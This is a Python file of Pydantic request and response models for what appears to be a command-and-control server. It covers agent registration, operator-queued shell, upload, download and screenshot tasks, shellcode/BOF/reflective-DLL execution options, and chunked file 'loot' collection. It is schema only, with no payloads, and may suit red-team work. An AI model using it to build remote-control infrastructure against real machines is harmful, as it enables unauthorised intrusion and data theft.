# ============================================================
#  server/models.py — Modèles Pydantic
#  Rôle        : Validation des requêtes/réponses API
#  Importé par : routes.agent, routes.operator
#  Dépend de   : pydantic
# ============================================================

from pydantic import BaseModel, Field
from typing import Optional


class AgentRegister(BaseModel):
    """
    Enregistrement d'un agent (premier démarrage ou reconnexion).
    agent_id est optionnel : l'agent l'envoie s'il a déjà un .agent_id sauvegardé.
    Le serveur réutilise cet ID s'il est valide, sinon cherche par empreinte machine.
    """
    hostname: str = Field(..., min_length=1, description="Nom de la machine")
    username: str = Field(..., min_length=1, description="Nom d'utilisateur")
    os: str = Field(..., min_length=1, description="Système d'exploitation")
    agent_id: Optional[str] = Field(None, description="ID déjà attribué (reconnexion)")


class CommandSubmit(BaseModel):
    """Envoi d'une commande à un agent."""
    agent_id:      str           = Field(..., min_length=8, max_length=8, description="ID de l'agent cible")
    command:       str           = Field(..., min_length=1, description="Commande à exécuter")
    session_token: str           = Field(..., min_length=36, description="Token de session opérateur")
    module:        Optional[str] = Field("shell", description="Module: shell | upload | download | sysinfo | screenshot | ...")
    file_data:     Optional[str] = Field("", description="Données fichier encodées base64 (upload)")
    filename:      Optional[str] = Field("", description="Nom du fichier source (upload)")
    technique:     Optional[str] = Field("", description="Technique d'exécution: bof | rdll | shellcode | src | '' (built-in)")


class CommandResult(BaseModel):
    """Résultat retourné par l'agent."""
    task_id: str = Field(..., min_length=12, description="ID unique de la tâche")
    agent_id: str = Field(..., min_length=8, max_length=8, description="ID de l'agent")
    output: str = Field(..., description="Sortie de la commande")
    status: str = Field(..., pattern="^(success|error|timeout)$", description="Statut d'exécution")


class OperatorLogin(BaseModel):
    """Connexion d'un opérateur."""
    operator_name: str = Field(..., min_length=1, description="Nom d'utilisateur")
    password: str = Field(..., min_length=1, description="Mot de passe")


class FileChunk(BaseModel):
    """
    Chunk de fichier envoyé par l'agent lors d'un transfert chunké.
    Utilisé par mod_screenshot (et potentiellement d'autres modules).
    Le serveur réassemble les chunks dans l'ordre et sauvegarde dans loot/.
    """
    agent_id:     str = Field(..., min_length=8, max_length=8)
    task_id:      str = Field(..., min_length=1)
    filename:     str = Field(..., min_length=1)
    chunk_index:  int = Field(..., ge=0)
    total_chunks: int = Field(..., ge=1)
    data:         str = Field(..., description="Chunk encodé en base64")


class TaskResponse(BaseModel):
    """Réponse contenant une tâche pour l'agent."""
    has_task:  bool          = Field(...,  description="Indique si une tâche est disponible")
    task_id:   Optional[str] = Field(None, description="ID de la tâche")
    command:   Optional[str] = Field(None, description="Commande à exécuter")
    module:    Optional[str] = Field(None, description="Type de tâche: shell/upload/download/screenshot/...")
    file_data: Optional[str] = Field(None, description="Données de fichier encodées en base64 (pour upload)")
    filename:  Optional[str] = Field("",   description="Nom du fichier source (upload)")
    technique: Optional[str] = Field("",   description="Technique d'exécution: bof | rdll | shellcode | src | '' (built-in)")